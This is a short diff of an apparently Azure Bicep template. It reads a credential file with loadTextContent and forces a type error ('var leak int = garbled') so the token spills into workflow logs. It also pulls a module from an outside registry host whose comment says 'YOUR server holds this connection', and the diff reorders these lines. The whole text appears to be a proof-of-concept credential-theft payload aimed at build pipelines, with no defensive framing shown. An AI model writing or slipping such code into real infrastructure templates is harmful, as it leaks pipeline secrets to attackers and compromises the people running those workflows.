@@ -10,13 +10,14 @@ var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
 // output garbledBE string = garbled2
 
 
+// Type error leaks garbled token to stderr (appears in workflow logs)
+var leak int = garbled
+
+output x string = 'x'
+
 
 // OCI module reference - YOUR server holds this connection
 module delay 'br:lamian.robertprast.com/hold/x:v1' = {
   name: 'd'
 }
 
-// Type error leaks garbled token to stderr (appears in workflow logs)
-var leak int = garbled
-
-output x string = 'x'
